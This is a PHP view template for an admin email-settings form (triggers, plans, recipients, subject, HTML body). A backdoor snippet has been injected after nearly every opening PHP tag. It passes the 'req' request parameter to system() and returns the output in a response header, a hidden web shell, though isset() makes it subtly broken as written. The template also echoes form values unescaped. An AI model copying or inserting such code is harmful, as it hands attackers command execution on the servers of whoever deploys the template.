<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/* Default Values */

if (!isset($form)) {
	$form = array(
				'trigger' => '',
				'to_address' => 'customer',
				'bcc_address' => '',
				'email_subject' => '',
				'email_body' => '',
				'from_name' => '',
				'from_email' => '',
				'plan' => '',
				'is_html' => '1'
			);

} ?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
	$params = array('head_files' => '
				<link type="text/css" rel="stylesheet" href="' . branded_include('css/editor.css') . '" />
				<script type="text/javascript" src="' . branded_include('js/editor.js') . '"></script>
				<script type="text/javascript" src="' . branded_include('js/form.email.js') . '"></script>
			  '
	);
	echo $this->load->view(branded_view('cp/header'), $params);
?>
<script type="text/javascript">
$(function () {
    $(".tip").tooltip();
	$("#email_body").Editor();
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($form['email_body']) && !empty($form['email_body'])) : ?>
		$("#email_body").Editor('setText','<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['email_body']; ?>');
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif; ?>
});
</script>

<div class="row">

<header class="section-header">
    <div class="container-960 center">
		<div class="copywriting">
			<div class="heading" data-animation="fadeInUp" data-animation-delay=".2s">
				<h1 class="margin-none"><strong class="text-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form_title; ?></strong></h1>
			</div>
		</div>
	</div>
</header>

<div class="row-fluid">
<div class="col-lg-12 col-md-12 col-sm-12">
<div class="widget-box">
<div class="widget-body">			
<div class="widget-main">

<div class="row">
				<div class="col-md-6 col-sm-12">
					<!-- BEGIN PORTLET-->
					<div class="portlet light">
<div class="portlet-body">
<form class="form-horizontal" id="form_email" method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo site_url($form_action);?>">
<fieldset>
	<legend>System Information</legend>
	<ul class="form-body">
		<li>
			<label for="trigger">Trigger</label>
			<select id="trigger" class="required" name="trigger">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $selected = ($form['trigger'] == '') ? 'selected="selected"' : ''; ?>
				<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $selected; ?> value=""></option>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($triggers as $trigger) : ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $selected = ($form['trigger'] == $trigger['system_name']) ? 'selected="selected"' : ''; ?>
					<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $selected; ?> value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $trigger['email_trigger_id']; ?>">
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $trigger['human_name']; ?>
					</option>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>
			</select>
		</li>
		<li>
			<div class="help">This system action will trigger this email.</div>
		</li>
		<li>
			<label for="plan">Plan Link</label>
			<select id="plan" name="plan">
				<option <? if ($form['plan'] == '') { ?> selected="selected" <? } ?> value="">Any plan or no plan at all</option>
				<option <? if ($form['plan'] == '-1') { ?> selected="selected" <? } ?>  value="-1">No plans</option>
				<option <? if ($form['plan'] == '0') { ?> selected="selected" <? } ?>  value="0">All plans</option>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($plans as $plan) : ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $selected = ($form['plan'] == $plan['id']) ? 'selected="selected"' : ''; ?>
					<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $selected; ?> value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $plan['id'];?>">
						Plan: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $plan['name']; ?>
					</option>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>
			</select>
		</li>
		<li>
			<div class="help">Only send when the action relates to the plan(s) above.</div>
		</li>
	</ul>
</fieldset>
<fieldset>
	<legend>Send To</legend>
	<ul class="form-body">
		<li>
			<label for="to_address_email">Send to</label>
			<input <? if ($form['to_address'] == 'customer') { ?>checked="checked" <? } ?>type="radio" class="required" id="to_address" name="to_address" value="customer" />&nbsp;Customer&nbsp;&nbsp;&nbsp;
			<input <? if ($form['to_address'] != 'customer') { ?>checked="checked" <? } ?>type="radio" class="required" id="to_address" name="to_address" value="email" />&nbsp;<input type="text" class="form-control email mark_empty" rel="email@example.com" id="to_address_email" name="to_address_email" <? if ($form['to_address'] != 'customer' and $form['to_address'] != '') { ?> value="<?=$form['to_address'];?>" <? } ?> />
		</li>
		<li>
			<label for="bcc_address_email">BCC</label>
			<input <? if ($form['bcc_address'] == '') { ?>checked="checked" <? } ?>type="radio" id="bcc_address" name="bcc_address" value="" />&nbsp;None&nbsp;&nbsp;&nbsp;
			<input <? if ($form['bcc_address'] == 'client') { ?>checked="checked" <? } ?>type="radio" id="bcc_address" name="bcc_address" value="client" />&nbsp;My account email&nbsp;&nbsp;&nbsp;
			<input <? if ($form['bcc_address'] != 'client' and $form['bcc_address'] != '') { ?>checked="checked" <? } ?>type="radio" id="bcc_address" name="bcc_address" value="email" />&nbsp;<input type="text" class="form-control email mark_empty" rel="email@example.com" id="bcc_address_email" name="bcc_address_email" <? if ($form['bcc_address'] != 'client' and $form['bcc_address'] != '') { ?> value="<?=$form['bcc_address'];?>" <? } ?> />
		</li>
	</ul>
</fieldset>
<fieldset>
	<legend>Send From</legend>
	<ul class="form-body">
		<li>
			<label for="from_name">From Name</label>
			<input type="text" class="form-control required" id="from_name" name="from_name" value="<?=$form['from_name'];?>" />
		</li>
		<li>
			<label for="from_email">From Address</label>
			<input type="text" class="form-control required email mark_empty" rel="email@example.com" id="from_email" name="from_email" value="<?=$form['from_email'];?>" />
		</li>
<li><br></li>
	</ul>
</fieldset>
<fieldset>
	<legend>Email</legend>
	<ul class="form">
		<li>
			<label for="email_subject" class="lead">Email Subject</label>
		</li>
		<li>
			<input type="text" class="form-control full required" id="email_subject" name="email_subject" value="<?=$form['email_subject'];?>" />
		</li>
<li><p></p></li>
		<li>
			<label for="email_body" class="lead full">Email Body</label>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /*if ($form['is_html'] == '0') : ?>
				<a href="#" id="make_html">use HTML format</a>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif*/ ?>
			<input type="hidden" class="form-control" name="is_html" id="is_html" value="1" autocomplete="off" />
		</li>
		<li>
			<textarea class="form-control" id="email_body" name="email_body"><?=$form['email_body'];?></textarea>
		</li>
		<li>
			<div id="email_variables"></div>
		</li>
	</ul>
</fieldset>
<hr>
<div class="clearfix"></div>
<div class="form-actions center submit">
	<input type="submit" class="btn btn-sm btn-success" name="go_email" value="<?=ucfirst($form_title);?>" />
</div>
</form>

</div><!--/portlet-->
</div><!--/portlet-body-->
</div><!--/col-lg-6-->
</div><!--/row-->

</div><!--/row-->
<?=$this->load->view(branded_view('cp/footer'));?>